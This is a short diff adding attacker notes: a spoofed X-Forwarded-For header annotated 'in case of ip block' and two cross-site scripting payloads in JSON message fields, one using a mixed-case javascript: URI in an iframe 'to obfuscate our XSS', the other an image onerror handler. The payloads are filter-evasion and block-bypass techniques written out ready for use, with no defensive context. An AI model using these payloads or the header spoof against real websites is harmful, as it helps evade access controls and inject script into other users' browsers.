@@ -1,0 +1,4 @@
+X-Forwarded-For: 1.1.1.1 -> in case of ip block
+{"message":"<iframe src='jAvAsCripT:alert`1`'></iframe>"}-> to obfuscate our XSS
+
+{"message":"<img src=1 onerror='alert(1)'/>"}
